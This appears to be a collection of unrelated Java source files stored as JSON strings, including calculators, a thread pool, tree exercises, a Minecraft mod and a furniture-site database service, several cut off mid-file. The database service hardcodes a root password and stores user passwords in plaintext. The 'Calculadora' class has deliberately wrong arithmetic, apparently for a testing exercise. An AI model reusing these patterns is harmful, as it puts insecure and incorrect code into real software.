    "import java.util.Scanner;\r\n\r\npublic class Calculator {\r\n    public static void main(String[] args) {\r\n        Scanner scanner = new Scanner(System.in);\r\n\r\n        System.out.println(\"Welcome to Calculator!\");\r\n        double num1, num2;\r\n        char operator;\r\n        \r\n        // Input for the first number\r\n        while (true) {\r\n            System.out.println(\"Enter the first number:\");\r\n            if (scanner.hasNextDouble()) {\r\n                num1 = scanner.nextDouble();\r\n                break;\r\n            } else {\r\n                System.out.println(\"Invalid input! Please enter a valid number.\");\r\n                scanner.next(); // Clear the invalid input\r\n            }\r\n        }\r\n        \r\n        // Input for the second number\r\n        while (true) {\r\n            System.out.println(\"Enter the second number:\");\r\n            if (scanner.hasNextDouble()) {\r\n                num2 = scanner.nextDouble();\r\n                break;\r\n            } else {\r\n                System.out.println(\"Invalid input! Please enter a valid number.\");\r\n                scanner.next(); // Clear the invalid input\r\n            }\r\n        }\r\n\r\n        // Input for the operator\r\n        while (true) {\r\n            System.out.println(\"Choose operation: +, -, *, /\");\r\n            String input = scanner.next();\r\n            if (input.length() == 1) {\r\n                operator = input.charAt(0);\r\n                if (operator == '+' || operator == '-' || operator == '*' || operator == '/') {\r\n                    break;\r\n                }\r\n            }\r\n            System.out.println(\"Invalid input! Please enter a valid operator.\");\r\n        }\r\n\r\n        double result;\r\n\r\n        switch (operator) {\r\n            case '+':\r\n                result = num1 + num2;\r\n                break;\r\n            case '-':\r\n                result = num1 - num2;\r\n                break;\r\n            case '*':\r\n                result = num1 * num2;\r\n                break;\r\n            case '/':\r\n                if (num2 != 0) {\r\n                    result = num1 / num2;\r\n                } else {\r\n                    System.out.println(\"Error: Division by zero!\");\r\n                    return;\r\n                }\r\n                break;\r\n            default:\r\n                System.out.println(\"Invalid operator!\");\r\n                return;\r\n        }\r\n\r\n        System.out.println(\"Result: \" + result);\r\n    }\r\n}\r\n",
    "import java.util.ArrayDeque;\nimport java.util.Queue;\n\npublic class ThreadPool {\n\n    private final int coreThreadNum;\n    private final int maxThreadNum;\n    private boolean isRun;\n    private final Thread[] threads;\n    private int nowCoreThreadAliveNum;\n    private final Object locked = new Object();\n    private final Object[] lockedArray;\n    private int nowThreadNum;\n    private final Object creatLocked = new Object();\n    Queue<Runnable> mQueue;\n\n    public ThreadPool(int coreThreadNum, int maxThreadNum) {\n        this.coreThreadNum = coreThreadNum;\n        this.maxThreadNum = maxThreadNum;\n        this.isRun = false;\n        this.threads = new Thread[coreThreadNum];\n        this.mQueue = new ArrayDeque<>();\n        this.lockedArray = new Object[coreThreadNum];\n        this.nowThreadNum = coreThreadNum;\n        this.nowCoreThreadAliveNum = 0;\n        for (int i = 0; i < coreThreadNum; i++) {\n            this.lockedArray[i] = new Object();\n        }\n    }\n\n    public ThreadPool() {\n        this(5, 10);\n    }\n\n    public void push(Runnable runnable) {\n        mQueue.add(runnable);\n        if (isRun) {\n            for (int i = 0; i < coreThreadNum; i++) {\n                synchronized (lockedArray[i]) {\n                    lockedArray[i].notify();\n                }\n            }\n\n        }\n    }\n\n    private void createTempThread() {\n        new Thread(()->{\n            while (true){\n                Runnable nowWork;\n                synchronized (creatLocked){\n                    while (mQueue.isEmpty()||nowThreadNum>=maxThreadNum||nowCoreThreadAliveNum<coreThreadNum){\n                        try {\n                            creatLocked.wait();\n                        } catch (InterruptedException e) {\n                            throw new RuntimeException(e);\n                        }\n                    }\n                    synchronized (locked) {\n                        if (!mQueue.isEmpty()) {\n                            nowWork = mQueue.remove();\n                        } else {\n                            continue;\n                        }\n                    }\n                    nowThreadNum++;\n                    new Thread(() -> {\n                        nowWork.run();\n                        nowThreadNum--;\n                    }).start();\n                }\n            }\n        }).start();\n    }\n\n    public void run() {\n        if (isRun) {\n            return;\n        }\n        isRun = true;\n        createTempThread();\n        for (int i = 0; i < coreThreadNum; i++) {\n            int finalI = i;\n            threads[i] = new Thread(() -> {\n                while (true) {\n                    Runnable nowWork;\n                    synchronized (lockedArray[finalI]) {\n                        while (mQueue.isEmpty()) {\n                            try {\n                                lockedArray[finalI].wait();\n                            } catch (InterruptedException e) {\n                                throw new RuntimeException(e);\n                            }\n                        }\n                        synchronized (locked) {\n                            if (!mQueue.isEmpty()) {\n                                nowWork = mQueue.remove();\n                            } else {\n                                continue;\n                            }\n                        }\n                    }\n                    nowCoreThreadAliveNum++;\n                    synchronized (creatLocked){\n                        creatLocked.notify();\n                    }\n                    nowWork.run();\n                    nowCoreThreadAliveNum--;\n                }\n            });\n            threads[i].start();\n        }\n    }\n}\n\n",
    "package class2.day01;\n\nimport java.io.*;\nimport java.util.StringTokenizer;\n\npublic class No1018 {\n    public static void main(String[] args) throws IOException {\n        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n        StringTokenizer st = new StringTokenizer(br.readLine());\n\n        int row = Integer.parseInt(st.nextToken());\n        int col = Integer.parseInt(st.nextToken());\n        String[] board = new String[row];\n        for (int i = 0; i < row; i++) {\n            board[i] = br.readLine();\n        }\n\n        int minChange = Integer.MAX_VALUE;\n        for (int n = 0; n < row - 7; n++) {\n            for (int m = 0; m < col - 7; m++) {\n                int tmp = repaint(n, m, board);\n                if (tmp < minChange) {\n                    minChange = tmp;\n                }\n            }\n        }\n\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(System.out));\n        bw.write(String.valueOf(minChange));\n        bw.flush();\n        bw.close();\n\n    }\n\n    private static int repaint(int n, int m, String[] board) {\n        char color = 'B';\n        int count = Integer.MAX_VALUE;\n\n        do {\n            int tmp = 0;\n\n            for (int i = n; i < n + 8; i += 2) {\n                tmp += repaintRow(color, m, board[i]);\n            }\n            color = changeColor(color);\n            for (int i = n + 1; i < n + 8; i += 2) {\n                tmp += repaintRow(color, m, board[i]);\n            }\n\n            if (tmp < count) {\n                count = tmp;\n            }\n\n        } while (color == 'W');\n\n        return count;\n    }\n\n    private static int repaintRow(char color, int m, String board) {\n        int count = 0;\n        for (int i = m; i < m + 8; i += 2) {\n            if (board.charAt(i) != color) {\n                count++;\n            }\n        }\n        color = changeColor(color);\n        for (int i = m + 1; i < m + 8; i += 2) {\n            if (board.charAt(i) != color) {\n                count++;\n            }\n        }\n        return count;\n    }\n\n    private static char changeColor(char color) {\n        if (color == 'B') {\n            return 'W';\n        }\n        return 'B';\n    }\n}\n",
    "package BinaryTree;\n\nimport java.util.LinkedList;\nimport java.util.Queue;\n\npublic class prg3 {\n    private TreeNode root;\n    private class TreeNode{\n        private TreeNode left,right;\n        private int data;\n        public TreeNode(int data){\n            this.data=data;\n        }\n    }\n    public void onCreate(){\n        TreeNode first=new TreeNode(1);\n        TreeNode second=new TreeNode(2);\n        TreeNode third=new TreeNode(3);\n        TreeNode fourth=new TreeNode(4);\n        TreeNode fifth=new TreeNode(5);\n        root=first;\n        first.left=second;\n        first.right=third;\n        second.left=fourth;\n        second.right=fifth;\n    }\n    public void insert(int value){\n        root=insert(root, value);\n    }\n    public TreeNode insert(TreeNode root,int value){\n        if(root==null){\n            root=new TreeNode(value);\n            return root;\n        }\n        if(value < root.data){\n            root.left=insert(root.left, value);\n        }\n        if(value>root.data){\n            root.right=insert(root.right, value);\n        }\n        return root;\n    }\n    public void inOrder(){\n        inOrder(root);\n    }\n    public void inOrder(TreeNode root)\n    {\n        if(root==null){\n            return;\n        }\n        inOrder(root.left);\n        System.out.print(root.data);\n        inOrder(root.right);\n    }\n    public int findMax(TreeNode root){\n        if(root==null){\n            return Integer.MIN_VALUE;\n        }\n        int result=root.data;\n        int left=findMax(root.left);\n        int right=findMax(root.right);\n        if(left>result){\n            result=left;\n        }\n        if(right>result){\n            result=right;\n        }\n        return result;\n    }\n    public TreeNode search(int key){\n        return search(root,key);\n    }\n    public TreeNode search(TreeNode root,int key){\n        if(root==null||root.data==key){\n            return root;\n        }\n        if(key>root.data){\n            return search(root.right,key);\n        }\n        else{\n            return search(root.left,key);\n        }\n    }\n    public static void main(String[] args) {\n        prg3 obj=new prg3();\n        obj.insert(5);\n        obj.insert(7);\n        obj.insert(3);\n        obj.insert(2);\n        obj.insert(4);\n        obj.insert(8);\n        obj.insert(9);\n        obj.insert(10);\n        obj.inOrder();\n        System.out.println();\n        TreeNode result=obj.search(11);\n        if(result==null){\n            System.out.println(\"Key not found\");\n        }else{\n            System.out.println(\"key found in the Binary tree\");\n        }\n    }\n}\n",
    "package io.github.crative.extended_armor.items.custom;\n\nimport com.google.common.collect.ImmutableMap;\nimport io.github.crative.extended_armor.effects.ExtendedArmorCustomEffects;\nimport io.github.crative.extended_armor.effects.ExtendedArmorParticles;\nimport io.github.crative.extended_armor.effects.ExtendedArmorStatusEffects;\nimport io.github.crative.extended_armor.items.armor_materials.ExtendedArmorMaterials;\nimport net.minecraft.entity.Entity;\nimport net.minecraft.entity.player.PlayerEntity;\nimport net.minecraft.item.ArmorItem;\nimport net.minecraft.item.ArmorMaterial;\nimport net.minecraft.item.ItemStack;\nimport net.minecraft.world.World;\n\nimport java.util.Map;\n\n/**\n * Most of the Code from Kaupenjoe's Fabric 1.20.X Modding YT-series\n * Added my own functionality and logic\n * @Credit: Kaupenjoe\n */\npublic class ExtendedArmorItem extends ArmorItem {\n\tprivate static final ExtendedArmorCustomEffects customEffects = new ExtendedArmorCustomEffects();\n\tprivate static final Map<ArmorMaterial, Integer> MATERIAL_TO_EFFECT_MAP =\n\t\t(new ImmutableMap.Builder<ArmorMaterial, Integer>())\n\t\t\t.put(ExtendedArmorMaterials.COPPER, 0)\n\t\t\t.put(ExtendedArmorMaterials.OBSIDIAN, 1)\n\t\t\t.put(ExtendedArmorMaterials.STEALTH, 2).build();\n\n\tpublic ExtendedArmorItem(ArmorMaterial material, ArmorSlot slot, Settings settings) {\n\t\tsuper(material, slot, settings);\n\t}\n\n\t/**\n\t * Get called every tick and checks if the entity wearing the armor is the player,\n\t * and if it has a full suit of armor on.\n\t * If that is true, then it checks which setBonus to give to the player\n\t * @param stack provided by ArmorItem\n\t * @param world world the player is in\n\t * @param entity entity that has the item in the inventory\n\t * @param slot slot the item is in\n\t * @param selected if item is selected\n\t */\n\t@Override\n\tpublic void inventoryTick(ItemStack stack, World world, Entity entity, int slot, boolean selected) {\n\t\tif(!world.isClient){\n\t\t\tif(entity instanceof PlayerEntity player && _hasFullSuitOfArmorOn(player)){\n\t\t\t\t_evaluateSetBonus(player, world);\n\t\t\t}\n\t\t}\n\t}\n\n\t/**\n\t * Switches through the different setBoni keys and running the desired particle and/or StatusEffect function\n\t * @param player player entity\n\t * @param mapArmorMaterial Armor material\n\t * @param setBonusKey Integer key for which setBonus to give\n\t * @param world world where player is\n\t */\n\tprivate void executeSetBonus(PlayerEntity player, ArmorMaterial mapArmorMaterial, Integer setBonusKey, World world) {\n\t\tswitch (setBonusKey){\n\t\t\tcase 0:\n\t\t\t\tcustomEffects.addStatusEffectToPlayer(player, world, mapArmorMaterial, ExtendedArmorStatusEffects.COPPER);\n\t\t\t\tcustomEffects.addParticalsToPlayer(player, world, ExtendedArmorParticles.COPPER);\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tcustomEffects.addStatusEffectToPlayer(player, world, mapArmorMaterial, ExtendedArmorStatusEffects.OBSIDIAN);\n\t\t\t\tcustomEffects.addParticalsToPlayer(player, world, ExtendedArmorParticles.OBSIDIAN);\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tcustomEffects.stealthEffect(player, world, mapArmorMaterial);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\n\t/**\n\t * Loops through every entry in the MATERIAL_TO_EFFECT_MAP map\n\t * Checks if the player has an armor on that is on the list\n\t * If yes then it calls the executeSetBonus methode\n\t * @param player player entity\n\t * @param world world player is in\n\t */\n\tprivate void _evaluateSetBonus(PlayerEntity player, World world) {\n\t\tfor(Map.Entry<ArmorMaterial, Integer> entry : MATERIAL_TO_EFFECT_MAP.entrySet()){\n\t\t\tArmorMaterial mapArmorMaterial = entry.getKey();\n\t\t\tInteger setBonusKey = entry.getValue();\n\n\t\t\tif(_hasCorrectArmorOn(mapArmorMaterial, player)){\n\t\t\t\texecuteSetBonus(player, mapArmorMaterial, setBonusKey, world);\n\t\t\t}\n\t\t}\n\t}\n\n\t/**\n\t * for-loop is a failsafe for wearing armor\n\t * gets each item in the armor slots and checks if it is form an armor material in the map\n\t * @Credit: Kaupenjoe's YouTube series on Fabric modding\n\t * @param mapArmorMaterial armor material to be effected\n\t * @param player player entity\n\t */\n\tpublic static boolean _hasCorrectArmorOn(ArmorMaterial mapArmorMaterial, PlayerEntity player) {\n\t\tfor(ItemStack armorStack : player.getInventory().armor){\n\t\t\tif(!(armorStack.getItem() instanceof ArmorItem)){\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\n\t\tArmorItem boots = ((ArmorItem) player.getInventory().getArmorStack(0).getItem());\n\t\tArmorItem leggings = ((ArmorItem) player.getInventory().getArmorStack(1).getItem());\n\t\tArmorItem chestplate= ((ArmorItem) player.getInventory().getArmorStack(2).getItem());\n\t\tArmorItem helmet = ((ArmorItem) player.getInventory().getArmorStack(3).getItem());\n\n\t\treturn helmet.getMaterial() == mapArmorMaterial\t&& chestplate.getMaterial() == mapArmorMaterial\n\t\t\t&& leggings.getMaterial() == mapArmorMaterial && boots.getMaterial() == mapArmorMaterial;\n\t}\n\n\t/**\n\t * returns true if the player has a full suit of armor on\n\t * @param player player entity\n\t */\n\tprivate boolean _hasFullSuitOfArmorOn(PlayerEntity player) {\n\t\tItemStack boots = player.getInventory().getArmorStack(0);\n\t\tItemStack leggings ",
    "package br.edu.iftm.testescalculadora;\r\n\r\npublic class Calculadora {\r\n    private int memoria;\r\n\r\n    public Calculadora() {\r\n        this.memoria = 1;\r\n    }\r\n\r\n    public Calculadora(int memoria) {\r\n        this.memoria = memoria;\r\n    }\r\n\r\n    public int getMemoria() {\r\n        return this.memoria;\r\n    }\r\n\r\n    public void zerarMemoria() {\r\n        this.memoria = 0;\r\n    }\r\n\r\n    public void somar(int valor) {\r\n        this.memoria += valor;\r\n    }\r\n\r\n    public void subtrair(int valor) {\r\n        this.memoria = this.memoria;\r\n    }\r\n\r\n    public void multiplicar(int valor) {\r\n        this.memoria = this.memoria / valor;\r\n    }\r\n\r\n    public void dividir(int valor) throws Exception {\r\n        if (valor <= 1)\r\n            throw new Exception(\"Divis\u00e3o por zero!!!\");\r\n        this.memoria = this.memoria / valor;\r\n    }\r\n\r\n    public void exponenciar(int valor) throws Exception {\r\n        if (valor > 10)\r\n            throw new Exception(\"Expoente incorreto, valor m\u00e1ximo \u00e9 10.\");\r\n        for (int i = 1; i < 10; i++) {\r\n            this.memoria *= this.memoria;\r\n        }\r\n    } \r\n}\r\n",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage core;\r\n\r\nimport java.sql.Connection;\r\nimport java.sql.PreparedStatement;\r\nimport java.sql.SQLException;\r\nimport java.util.Date;\r\n\r\n/**\r\n *\r\n * @author FTAB TECH\r\n */\r\npublic class Enseignant extends Contact {\r\n    private String statut;\r\n\r\n    public Enseignant(String code, String nom, Date dateNaissance, String adresse, String email, String telNumber, String statut) {\r\n        super(code, nom, dateNaissance, adresse, email, telNumber);\r\n        this.statut = statut;\r\n    }\r\n\r\n    public String getStatut() {\r\n        return statut;\r\n    }\r\n\r\n    public void setStatut(String statut) {\r\n        this.statut = statut;\r\n    }\r\n    \r\n    public void afficherContact() {\r\n        super.afficherContact();\r\n        \r\n        String str = statut + \")\";\r\n        System.out.println(str);\r\n    }\r\n\r\n    @Override\r\n    public void insererDansBD(Connection connection) {\r\n        // Requ\u00eate SQL pour ins\u00e9rer un enseignant dans la table Enseignant\r\n        String sql = \"INSERT INTO Enseignant (code, nom, dateNaissance, adresse, email, telNumber, statut) VALUES (?, ?, ?, ?, ?, ?, ?)\";\r\n\r\n        try {\r\n            // Cr\u00e9er un objet PreparedStatement avec la requ\u00eate SQL\r\n            PreparedStatement preparedStatement = connection.prepareStatement(sql);\r\n            \r\n            // D\u00e9finir les valeurs des param\u00e8tres de la requ\u00eate\r\n            preparedStatement.setString(1, getCode());\r\n            preparedStatement.setString(2, getNom());\r\n            preparedStatement.setDate(3, new java.sql.Date(getDateNaissance().getTime()));\r\n            preparedStatement.setString(4, getAdresse());\r\n            preparedStatement.setString(5, getEmail());\r\n            preparedStatement.setString(6, getTelNumber());\r\n            preparedStatement.setString(7, getStatut());\r\n            \r\n            // Ex\u00e9cuter la requ\u00eate d'insertion\r\n            preparedStatement.executeUpdate();\r\n            \r\n            // Fermer le PreparedStatement\r\n            preparedStatement.close();\r\n            \r\n            System.out.println(\"Enseignant ins\u00e9r\u00e9 avec succ\u00e8s dans la base de donn\u00e9es.\");\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n    \r\n    @Override\r\n    public Object[] toArray(){\r\n        Object[] array1 = super.toArray();\r\n        Object[] array2 = new Object[]{statut};\r\n        \r\n        return concatArrays(array1, array2);\r\n    }\r\n}",
    "package treeTraversalAlgorithm;\n\npublic class PostOrderTraversal {\n    public static void main(String[] args) {\n        int[] nodes = new int[]{1, 2, 4, -1, -1, 5, -1, -1, -1, 3, -1, 6, -1, -1};\n        BinaryTree binaryTree = new BinaryTree();\n        Node root = BinaryTree.buildTree(nodes);\n        binaryTree.postorder(root);\n    }\n\n    static class Node {\n        int data;\n        Node leftNode;\n        Node rightNode;\n\n        Node(int data) {\n            this.data = data;\n            this.leftNode = null;\n            this.rightNode = null;\n        }\n    }\n\n    static class BinaryTree {\n        static int index = -1;\n\n        public static Node buildTree(int[] nodes) {\n            index++;\n            if (nodes[index] == -1) {\n                return null;\n            }\n            Node newNode = new Node(nodes[index]);\n            newNode.leftNode = buildTree(nodes);\n            newNode.rightNode = buildTree(nodes);\n            return newNode;\n        }\n        // Postorder -> Left Subtree, Right Subtree, Root\n        public static void postorder(Node root){\n            if(root==null){\n                return;\n            }\n            postorder(root.leftNode);\n            postorder(root.rightNode);\n            System.out.print(root.data + \" \");\n        }\n    }\n}\n",
    "import java.util.*;\n\npublic class index {\n    static class BigGridelement {\n        char[][] grid;\n        char whoses = ' ';\n        boolean checker = false;\n    }\n\n    public static void game(BigGridelement[][] grid) {\n\n    }\n\n    public static void print(char[][] arr) {\n        for (int i = 0; i < 9; i++) {\n            \n        }\n    }\n\n    public static boolean smallerGrid(char[][] matrix) {\n\n        return false;\n    }\n\n    public static void whereto(int x, int y) {\n\n    }\n\n    public static char finalcheck(BigGridelement bg0, BigGridelement bg1, BigGridelement bg2, BigGridelement bg3,\n            BigGridelement bg4, BigGridelement bg5, BigGridelement bg6, BigGridelement bg7, BigGridelement bg8,\n            char whoses) {\n\n        // --- test\n        if (((bg0.checker && bg1.checker && bg2.checker) || (bg3.checker && bg4.checker && bg5.checker)\n                || (bg6.checker && bg7.checker && bg8.checker)) && whoses == 'X') {\n            return 'X';\n        } else if (((bg0.checker && bg1.checker && bg2.checker) || (bg3.checker && bg4.checker && bg5.checker)\n                || (bg6.checker && bg7.checker && bg8.checker)) && whoses == 'O') {\n            return 'O';\n        }\n\n        // ||| test\n        else if (((bg0.checker && bg3.checker && bg6.checker) || (bg1.checker && bg4.checker && bg7.checker)\n                || (bg2.checker && bg5.checker && bg8.checker)) && whoses == 'X') {\n            return 'X';\n        } else if (((bg0.checker && bg3.checker && bg6.checker) || (bg1.checker && bg4.checker && bg7.checker)\n                || (bg2.checker && bg5.checker && bg8.checker)) && whoses == 'O') {\n            return 'O';\n        }\n\n        // /// test\n        else if ((bg3.checker && bg5.checker && bg7.checker) && whoses == 'X') {\n            return 'X';\n        } else if ((bg3.checker && bg5.checker && bg7.checker) && whoses == 'O') {\n            return 'O';\n        }\n\n        // \\\\\\ test\n        else if ((bg0.checker && bg5.checker && bg8.checker) && whoses == 'X') {\n            return 'X';\n        } else if ((bg0.checker && bg5.checker && bg8.checker) && whoses == 'O') {\n            return 'O';\n        }\n\n        return 'N';\n\n    }\n\n    public static void changewhoses(BigGridelement a, char turn) {\n        if (a.whoses == ' ') {\n            a.whoses = turn;\n        } else {\n            System.out.println(\"This place is already taken!\");\n        }\n    }\n\n    public static void main(String[] args) {\n        BigGridelement bg0 = new BigGridelement();\n        BigGridelement bg1 = new BigGridelement();\n        BigGridelement bg2 = new BigGridelement();\n        BigGridelement bg3 = new BigGridelement();\n        BigGridelement bg4 = new BigGridelement();\n        BigGridelement bg5 = new BigGridelement();\n        BigGridelement bg6 = new BigGridelement();\n        BigGridelement bg7 = new BigGridelement();\n        BigGridelement bg8 = new BigGridelement();\n\n        bg0.grid = new char[3][3];\n        bg1.grid = new char[3][3];\n        bg2.grid = new char[3][3];\n        bg3.grid = new char[3][3];\n        bg4.grid = new char[3][3];\n        bg5.grid = new char[3][3];\n        bg6.grid = new char[3][3];\n        bg7.grid = new char[3][3];\n        bg8.grid = new char[3][3];\n\n        BigGridelement[][] grid = new BigGridelement[3][3];\n        grid[0][0] = bg0;\n        grid[0][1] = bg1;\n        grid[0][2] = bg2;\n        grid[1][0] = bg3;\n        grid[1][1] = bg4;\n        grid[1][2] = bg5;\n        grid[2][0] = bg6;\n        grid[2][1] = bg7;\n        grid[2][2] = bg8;\n\n        game(grid);\n\n    }\n}",
    "package dbs;\r\n\r\nimport java.sql.Connection;\r\nimport java.sql.DriverManager;\r\nimport java.sql.PreparedStatement;\r\nimport java.sql.ResultSet;\r\nimport java.util.ArrayList;\r\n\r\nimport javax.imageio.spi.RegisterableService;\r\n\r\nimport dto.Admin;\r\nimport dto.Contactus;\r\nimport dto.Reg;\r\n\r\npublic class DBService {\r\n    Connection con = null;\r\n\r\n    public DBService() {\r\n        try {\r\n            Class.forName(\"com.mysql.cj.jdbc.Driver\");\r\n            con = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/furniture?user=root&password=Vishal*789\");\r\n        } catch (Exception e) {\r\n            System.out.print(e);\r\n        }\r\n    }\r\n\r\n    // user\r\n    public boolean user(Admin a)\r\n    {\r\n        boolean isValid = false;\r\n        try \r\n        {\r\n            PreparedStatement ps = con.prepareStatement(\"select * from signup where Email = ? and Password = ?\");\r\n            ps.setString(1, a.getEmail());\r\n            ps.setString(2, a.getPassword());\r\n            ResultSet rs = ps.executeQuery();\r\n            if (rs.next())\r\n            {\r\n                isValid = true;\r\n            }\r\n        } \r\n        catch (Exception e) \r\n        {\r\n            System.out.println(e);\r\n        }\r\n        return isValid;\r\n    }\r\n\r\n    // admin\r\n    public boolean admin(Admin a)\r\n    {\r\n        boolean isValid = false;\r\n        try \r\n        {\r\n            PreparedStatement ps = con.prepareStatement(\"select * from login where Email = ? and Password = ?\");\r\n            ps.setString(1, a.getEmail());\r\n            ps.setString(2, a.getPassword());\r\n            ResultSet rs = ps.executeQuery();\r\n            if (rs.next()) \r\n            {\r\n                isValid = true;\r\n            }\r\n        } \r\n        catch (Exception e) \r\n        {\r\n            System.out.println(e);\r\n        }\r\n        return isValid;\r\n    }\r\n\r\n\r\n\t\tpublic int signup(Admin a)\r\n\t\t{\r\n\t\t\tint x=0;\r\n\t\ttry \r\n\t\t{\r\n\t\t\r\n\t\t\tPreparedStatement ps = con.prepareStatement(\"insert into signup values (?, ?)\");\r\n\t        ps.setString(1, a.getEmail());\r\n\t        ps.setString(2, a.getPassword());\r\n\t        x = ps.executeUpdate();\r\n\t\t}\r\n\t\tcatch (Exception e) \r\n\t\t{\r\n\t\t\tSystem.out.println(e);\r\n\t\t}\r\n\t\t\r\n\t\treturn x;\r\n\t}\r\n\t\tpublic int forget(Admin a)\r\n\t\t{\r\n\t\t\tint x=0;\r\n\t\ttry \r\n\t\t{\r\n\t\t\r\n\t\tPreparedStatement ps = con.prepareStatement(\"update signup set Password = ? where Email=?\");\r\n\t\tps.setString(1, a.getPassword());\r\n\t\tps.setString(2, a.getEmail());\r\n\t\tx = ps.executeUpdate();\r\n\t\t}\r\n\t\tcatch (Exception e) \r\n\t\t{\r\n\t\t\tSystem.out.println(e);\r\n\t\t}\r\n\t\treturn x;\r\n\t}\r\n\t\t\r\n\t\tpublic  int contact(Contactus c)\r\n\t\t{\r\n\t\t\tint x=0;\r\n\t\ttry \r\n\t\t{\r\n\t\t\r\n\t\tPreparedStatement ps = con.prepareStatement(\"insert into contact values (?, ?, ?, ?)\");\r\n\t\tps.setString(1, c.getName());\r\n\t\tps.setString(2, c.getNumber());\r\n\t\tps.setString(3, c.getEmail());\r\n\t\tps.setString(4, c.getMsg());\r\n\t\tx = ps.executeUpdate(); \r\n\t\t}\r\n\t\tcatch (Exception e) \r\n\t\t{\r\n        System.out.println(e);\r\n        }\r\n        return x;\r\n      }\r\n//\t\tpublic int sagwan(Registration r)\r\n//\t\t{\r\n//\t\t\tint x=0;\r\n//\t\t\ttry\r\n//\t\t\t{\r\n//\t\t\t\tPreparedStatement ps=con.prepareStatement(\"insert into sagwan values(?, ?, ?, ?, ?)\");\r\n//\t\t\t    ps.setString(1, r.getName());\r\n//\t\t\t    ps.setString(2,r.getEmail());\r\n//\t\t\t    ps.setString(3, r.getNumber());\r\n//\t\t\t    ps.setString(4, r.getCity());\r\n//\t\t\t    ps.setString(5, r.getArtstyle());\r\n//\t\t\t    x = ps.executeUpdate();\r\n//\t\t\t}\r\n//\t\t\tcatch(Exception e)\r\n//\t\t\t{\r\n//\t\t\t\tSystem.out.println(e);\r\n//\t\t\t}\r\n//\t\t\treturn x;\r\n//\t\t}\r\n//\t\t\r\n//\t\tpublic int sal(Registration r)\r\n//\t\t{\r\n//\t\t\tint x=0;\r\n//\t\t\ttry\r\n//\t\t\t{\r\n//\t\t\t\tPreparedStatement ps=con.prepareStatement(\"insert into sal values(?, ?, ?, ?, ?)\");\r\n//\t\t\t    ps.setString(1, r.getName());\r\n//\t\t\t    ps.setString(2,r.getEmail());\r\n//\t\t\t    ps.setString(3, r.getNumber());\r\n//\t\t\t    ps.setString(4, r.getCity());\r\n//\t\t\t    ps.setString(5, r.getArtstyle());\r\n//\t\t\t    x = ps.executeUpdate();\r\n//\t\t\t}\r\n//\t\t\tcatch(Exception e)\r\n//\t\t\t{\r\n//\t\t\t\tSystem.out.println(e);\r\n//\t\t\t}\r\n//\t\t\treturn x;\r\n//\t\t}\r\n//\t\t\r\n//\t\tpublic int plywood(Registration r)\r\n//\t\t{\r\n//\t\t\tint x=0;\r\n//\t\t\ttry\r\n//\t\t\t{\r\n//\t\t\t\tPreparedStatement ps=con.prepareStatement(\"insert into plywood values(?, ?, ?, ?, ?)\");\r\n//\t\t\t    ps.setString(1, r.getName());\r\n//\t\t\t    ps.setString(2,r.getEmail());\r\n//\t\t\t    ps.setString(3, r.getNumber());\r\n//\t\t\t    ps.setString(4, r.getCity());\r\n//\t\t\t    ps.setString(5, r.getArtstyle());\r\n//\t\t\t    x = ps.executeUpdate();\r\n//\t\t\t}\r\n//\t\t\tcatch(Exception e)\r\n//\t\t\t{\r\n//\t\t\t\tSystem.out.println(e);\r\n//\t\t\t}\r\n//\t\t\treturn x;\r\n//\t\t}\r\n//\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\tpublic int reg(Reg r)\r\n\t\t{\r\n\t\t\tint x=0;\r\n\t\t\ttry\r\n\t\t\t{\r\n\t\t\t\tPreparedStatement ps=con.prepareStatement(\"insert into person values(?,?,?,?,?,?,?,?,?,?,?,?,?)\");\r\n\t\t\t    ps.setString(1, r.getFirstName());\r\n\t\t\t    ps.setString(2,r.getMiddleName());\r\n\t\t\t    ps.setString(3, r.getLastName());\r\n\t\t\t    ps.setString(4, r.getFatherName());\r\n\t\t\t    ps.setString(5, r.getMotherName());\r\n\t\t\t    ps.setString(6, r.getCountryCod",
    "package com.example.springsecuritywebflux.Models;\n\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport org.springframework.data.annotation.Id;\nimport org.springframework.data.mongodb.core.mapping.Document;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\nimport org.springframework.security.core.userdetails.UserDetails;\n\nimport java.util.Collection;\nimport java.util.Collections;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\n@Document\npublic class User implements UserDetails {\n    @Id\n    private String id ;\n    private String fullName ;\n    private String phoneNumber;\n    private String email ;\n    private String password ;\n    private String roles ;\n\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        return Collections.singleton(new SimpleGrantedAuthority(roles));\n    }\n\n    @Override\n    public String getUsername() {\n        return email;\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return true;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return true;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n}\n",
